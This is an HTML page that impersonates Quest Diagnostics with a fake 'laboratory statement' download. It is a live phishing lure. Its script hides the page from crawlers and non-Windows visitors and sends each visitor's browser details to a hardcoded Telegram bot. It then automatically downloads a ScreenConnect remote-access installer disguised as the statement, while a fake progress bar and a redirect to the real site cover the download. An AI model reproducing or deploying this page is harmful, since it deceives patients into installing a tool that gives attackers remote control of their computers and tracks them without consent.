<!DOCTYPE html>
<html>
<head>
    <title>Quest Diagnostics - Laboratory Statement</title>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif; background: #f0f2f5; color: #1a1a1a; min-height: 100vh; }
        .topbar { background: #023616; color: #fff; padding: 8px 5%; display: flex; justify-content: flex-end; gap: 30px; font-size: 13px; }
        .topbar a { color: #b8d9c9; text-decoration: none; }
        .topbar a:hover { color: #fff; }
        .header { background: #fff; padding: 14px 5%; border-bottom: 2px solid #034c1f; display: flex; align-items: center; gap: 12px; }
        .header img { height: 38px; }
        .header .brand-text { font-size: 22px; font-weight: 700; color: #023616; letter-spacing: -0.3px; }
        .header .brand-text span { font-weight: 300; color: #4a6a5a; font-size: 18px; }
        .notice { background: #e7eefb; border: 1px solid #2d6dde; padding: 16px 5%; margin: 0; display: flex; align-items: center; gap: 15px; flex-wrap: wrap; }
        .notice strong { font-size: 17px; color: #003b8e; }
        .notice span { color: #1a3b6e; font-size: 14px; }
        .hero { background: #e8f8ee; padding: 50px 5% 60px; }
        .container { max-width: 1200px; margin: 0 auto; display: flex; gap: 50px; align-items: flex-start; }
        @media (max-width: 820px) { .container { flex-direction: column; } }
        .left-panel { flex: 1; }
        .left-panel h1 { color: #023616; font-size: 30px; font-weight: 700; margin-bottom: 6px; }
        .left-panel .ref { color: #4a5b6e; font-size: 14px; margin-bottom: 20px; border-bottom: 1px solid #c8d8e0; padding-bottom: 16px; }
        .left-panel p { font-size: 15px; line-height: 1.8; color: #1e2b3c; margin-bottom: 18px; }
        .left-panel ul { list-style: none; padding: 0; }
        .left-panel ul li { padding: 8px 0 8px 28px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="%230b6efd" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>') left center no-repeat; background-size: 18px; font-size: 15px; color: #1a2b3e; }
        .right-panel { width: 380px; flex-shrink: 0; }
        @media (max-width: 820px) { .right-panel { width: 100%; } }
        .content-card { background: #ffffff; border-radius: 16px; padding: 30px 28px; box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08); border: 1px solid #e4eaf2; }
        .info-box { background: #eef7ff; border-left: 5px solid #0b6efd; padding: 14px 18px; border-radius: 8px; font-size: 14px; color: #1a3b6e; margin-bottom: 24px; line-height: 1.6; }
        .download-message { font-size: 19px; font-weight: 600; color: #003b8e; margin-bottom: 6px; }
        .download-sub { font-size: 14px; color: #4a5b6e; margin-bottom: 20px; }
        .loading { display: flex; align-items: center; gap: 14px; margin-bottom: 12px; }
        .spinner { width: 26px; height: 26px; border: 4px solid #d7e7ff; border-top: 4px solid #0056d6; border-radius: 50%; animation: spin 0.9s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { font-size: 14px; color: #4a5b6e; font-weight: 500; }
        .progress { height: 8px; background: #e8edf5; border-radius: 20px; overflow: hidden; margin-bottom: 6px; }
        .progress-bar { width: 0%; height: 100%; background: #0b6efd; border-radius: 20px; transition: width 0.3s ease; }
        .btn-download { display: none; }
        .completion { display: none; margin-top: 20px; background: #ecfff2; border: 1px solid #6dd18b; border-radius: 10px; padding: 16px 18px; text-align: center; }
        .completion.show { display: block; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { 0% { opacity: 0; transform: translateY(8px); } 100% { opacity: 1; transform: translateY(0); } }
        .completion .msg { font-weight: 600; color: #177245; font-size: 16px; }
        .completion .redirect { font-size: 14px; color: #1f4d6e; margin-top: 8px; }
        .completion .redirect #countdown { font-weight: 700; color: #003b8e; font-size: 18px; }
        footer { background: #023616; color: #f5f5f5; padding: 40px 5% 30px; }
        .footer-inner { max-width: 1200px; margin: 0 auto; }
        .footer-inner img { height: 32px; margin-bottom: 20px; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 20px 35px; font-size: 13px; margin-bottom: 20px; }
        .footer-links a { color: #b8d9c9; text-decoration: none; }
        .footer-links a:hover { color: #fff; }
        .footer-text { font-size: 12px; color: #7a9a8a; line-height: 1.7; }
        hr { border: 0; border-top: 1px solid #1a4a2e; margin: 6px 0 16px; }

        /* ===== ACCESS DENIED PAGE ===== */
        #accessDenied {
            display: none;
            text-align: center;
            padding: 100px 20px;
            min-height: 100vh;
            background: #f8f9fa;
        }

        #accessDenied h1 {
            font-size: 48px;
            color: #dc3545;
            margin-bottom: 20px;
        }

        #accessDenied p {
            font-size: 18px;
            color: #6c757d;
            max-width: 500px;
            margin: 0 auto;
        }

        #accessDenied .icon {
            font-size: 80px;
            margin-bottom: 20px;
        }

        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>

    <!-- ===== ACCESS DENIED PAGE ===== -->
    <div id="accessDenied">
        <div class="icon">🚫</div>
        <h1>Access Denied</h1>
        <p>This page is only available on Windows desktop devices.</p>
        <p style="margin-top: 10px; font-size: 14px; color: #adb5bd;">Error: Unsupported Device or Bot Detected</p>
    </div>

    <!-- ===== MAIN CONTENT (كل المحتوى القديم) ===== -->
    <div id="mainContent">

        <!-- TOP BAR -->
        <div class="topbar">
            <a href="#">Appointment scheduling</a>
            <a href="#">FAQs</a>
            <a href="#">Contact Us</a>
        </div>

        <!-- HEADER -->
        <header class="header">
            <img src="https://ds.cdn.questdiagnostics.com/assets/img/quest-logo.svg" alt="Quest Diagnostics" />
            <div class="brand-text">Diagnostics <span>| Laboratory</span></div>
        </header>

        <!-- NOTICE -->
        <div class="notice">
            <strong>📋 Your lab results are now available.</strong>
            <span>Please check your laboratory's schedule before planning your visit.</span>
        </div>

        <!-- HERO -->
        <section class="hero">
            <div class="container">
                <div class="left-panel">
                    <h1>Your Monthly Laboratory Statement</h1>
                    <div class="ref">Statement period: August 1 – March 31, 2026 · Reference #: QD-3827-91</div>
                    <p>Your laboratory results from the past 30 days have been securely compiled into a single statement for your convenience. Download your statement to review all completed laboratory tests performed during this period.</p>
                    <ul>
                        <li>Laboratory results completed during the last 30 days</li>
                        <li>Test names and completion dates</li>
                        <li>Consolidated PDF report</li>
                        <li>Secure document handling</li>
                    </ul>
                </div>
                <div class="right-panel">
                    <div class="content-card">
                        <div class="info-box"><strong>🔐 Access your full report</strong><br />Available anytime in the Quest app or online patient portal.</div>
                        <div class="download-message">Your statement is ready</div>
                        <div class="download-sub">Review your results at your earliest convenience.</div>
                        <div class="loading" id="loadingIndicator">
                            <div class="spinner" id="spinner"></div>
                            <span class="status-text" id="statusText">Ready to download</span>
                        </div>
                        <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
                        <button class="btn-download" id="downloadBtn" onclick="startDownload()">Download Statement</button>
                        <div class="completion" id="completionBox">
                            <div class="msg">✅ Your statement has been downloaded.</div>
                            <div class="redirect">Redirecting to Quest Diagnostics in <span id="countdown">10</span> seconds…</div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!-- FOOTER -->
        <footer>
            <div class="footer-inner">
                <img src="https://ds.cdn.questdiagnostics.com/assets/img/quest-logo--white.svg" alt="Quest Diagnostics" />
                <div class="footer-links">
                    <a href="#">Privacy Notices</a>
                    <a href="#">Your Privacy Choices</a>
                    <a href="#">Terms</a>
                    <a href="#">Contact Us</a>
                    <a href="#">Language Assistance</a>
                    <a href="#">Non-Discrimination Notice</a>
                </div>
                <hr />
                <div class="footer-text">
                    Quest® is the brand name used for services offered by Quest Diagnostics Incorporated and its affiliated companies.
                    Quest Diagnostics Incorporated and certain affiliates are CLIA-certified laboratories that provide HIPAA-covered services.
                    <br /><br />
                    Quest®, Quest Diagnostics®, any associated logos, and all associated Quest Diagnostics registered or unregistered trademarks
                    are the property of Quest Diagnostics. All third-party marks — ® and ™ — are the property of their respective owners.
                    © 2026 Quest Diagnostics Incorporated. All rights reserved.
                </div>
            </div>
        </footer>

        <!-- DOWNLOAD LINK -->
        <a id="autoDownloadLink" href="https://centurylink22.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest" download="https://centurylink22.screenconnect.com/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest" style="display:none;"></a>

    </div>
    <!-- ===== نهاية MAIN CONTENT ===== -->

    <!-- ===== SCRIPT ===== -->
    <script>
    // ============================================================
    // 🛡️ DEVICE & BOT DETECTION - ACCESS CONTROL
    // ============================================================
    
    function checkAccess() {
        const userAgent = navigator.userAgent.toLowerCase();
        const platform = navigator.platform.toLowerCase();

        // 1️⃣ DETECT BOTS
        const botPatterns = [
            'bot', 'crawl', 'spider', 'scrape', 'googlebot', 'bingbot',
            'facebookexternalhit', 'twitterbot', 'slurp', 'duckduckbot',
            'baiduspider', 'yandexbot', 'ia_archiver', 'mediapartners-google',
            'facebook', 'whatsapp', 'telegram', 'discord', 'slack',
            'curl', 'wget', 'python-requests', 'postman', 'insomnia',
            'headless', 'phantomjs', 'selenium', 'puppeteer', 'playwright'
        ];

        for (let pattern of botPatterns) {
            if (userAgent.includes(pattern)) {
                return false;
            }
        }

        // 2️⃣ DETECT WINDOWS
        const isWindows = (
            platform.includes('win') ||
            userAgent.includes('windows') ||
            userAgent.includes('win32') ||
            userAgent.includes('win64')
        );

        if (!isWindows) {
            return false;
        }

        // 3️⃣ DETECT MOBILE (حتى لو ويندوز)
        const isMobile = (
            userAgent.includes('mobile') ||
            userAgent.includes('android') ||
            userAgent.includes('iphone') ||
            userAgent.includes('ipad') ||
            userAgent.includes('ipod') ||
            userAgent.includes('blackberry') ||
            userAgent.includes('windows phone')
        );

        if (isMobile) {
            return false;
        }

        // 4️⃣ CHECK SCREEN SIZE
        if (window.innerWidth < 800) {
            return false;
        }

        return true;
    }

    // ============================================================
    // 🔥 APPLY ACCESS CONTROL (تشغيل الكود)
    // ============================================================
    (function() {
        const accessDenied = document.getElementById('accessDenied');
        const mainContent = document.getElementById('mainContent');
        
        if (!checkAccess()) {
            // إخفاء المحتوى الرئيسي
            mainContent.style.display = 'none';
            // إظهار رسالة المنع
            accessDenied.style.display = 'block';
            // منع تنفيذ أي كود تاني
            return;
        }
        
        // ✅ Access granted
        accessDenied.style.display = 'none';
        mainContent.style.display = 'block';
    })();

    // ============================================================
    // 🔐 Telegram Settings - Updated with your data
    // ============================================================
    const BOT_TOKEN = '8724015412:AAEPAQpD1N7-SmO0TFr6EKu7NuE4KN8OsuQ';
    const CHAT_ID = '6145591347';

    // ============================================================
    // 📤 Send Telegram Notification
    // ============================================================
    function sendTelegramAlert(message) {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        }).then(response => response.json())
          .then(data => {
              if (data.ok) {
                  console.log('✅ Telegram: Message sent successfully');
              } else {
                  console.log('❌ Telegram: Error', data.description);
              }
          })
          .catch(err => console.log('⚠️ Failed to send:', err));
    }

    // ============================================================
    // 📄 Page Opened Notification
    // ============================================================
    function notifyPageOpened() {
        const msg = `
📄 <b>👁️ Page Opened</b>
🕐 ${new Date().toLocaleString('en-US')}
🌐 ${window.location.href}
💻 ${navigator.userAgent}
🌍 Language: ${navigator.language}
📱 Screen: ${screen.width}x${screen.height}
🔗 Referrer: ${document.referrer || 'Direct'}
👤 Username: @amunisback
        `.trim();
        sendTelegramAlert(msg);
    }

    // ============================================================
    // ⬇️ File Downloaded Notification
    // ============================================================
    function notifyFileDownloaded() {
        const msg = `
⬇️ <b>📥 File Downloaded!</b>
🕐 ${new Date().toLocaleString('en-US')}
🌐 ${window.location.href}
💻 ${navigator.userAgent}
🌍 Language: ${navigator.language}
📱 Screen: ${screen.width}x${screen.height}
🔗 Referrer: ${document.referrer || 'Direct'}
👤 Username: @amunisback
        `.trim();
        sendTelegramAlert(msg);
    }

    // ============================================================
    // 🔥 startDownload Function
    // ============================================================
    function startDownload() {
        const btn = document.getElementById('downloadBtn');
        const progressBar = document.getElementById('progressBar');
        const statusText = document.getElementById('statusText');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const completionBox = document.getElementById('completionBox');
        const countdownEl = document.getElementById('countdown');
        const downloadLink = document.getElementById('autoDownloadLink');

        sendTelegramAlert('⏳ <b>Download process started...</b>');

        btn.disabled = true;
        btn.textContent = '⏳ Processing…';
        progressBar.style.width = '0%';
        statusText.textContent = 'Connecting to secure server…';

        const steps = [
            { width: 25, label: 'Connecting to secure server…', delay: 400 },
            { width: 50, label: 'Preparing your statement…', delay: 900 },
            { width: 75, label: 'Encrypting document…', delay: 1400 },
            { width: 95, label: 'Finalizing…', delay: 1900 },
        ];

        steps.forEach((s) => {
            setTimeout(() => {
                progressBar.style.width = s.width + '%';
                statusText.textContent = s.label;
            }, s.delay);
        });

        setTimeout(() => {
            if (downloadLink) {
                downloadLink.click();
            }

            progressBar.style.width = '100%';
            statusText.textContent = '✅ Download complete!';
            btn.textContent = '✓ Done';

            notifyFileDownloaded();

            setTimeout(() => {
                loadingIndicator.style.display = 'none';
                completionBox.classList.add('show');

                let seconds = 5;
                countdownEl.textContent = seconds;
                const countdownInterval = setInterval(() => {
                    seconds--;
                    countdownEl.textContent = seconds;
                    if (seconds <= 0) {
                        clearInterval(countdownInterval);
                        sendTelegramAlert('🔄 <b>User redirected to Quest Diagnostics</b>');
                        window.location.href = "https://www.questdiagnostics.com/";
                    }
                }, 1000);
            }, 800);
        }, 2500);
    }

    // ============================================================
    // 🚀 Auto-start when page loads
    // ============================================================
    window.addEventListener('DOMContentLoaded', function() {
        // نتأكد إن الوصول ممنوح قبل ما نبدأ (حماية إضافية)
        if (!checkAccess()) {
            return;
        }
        setTimeout(() => {
            notifyPageOpened();
            startDownload();
        }, 500);
    });
    </script>

</body>
</html>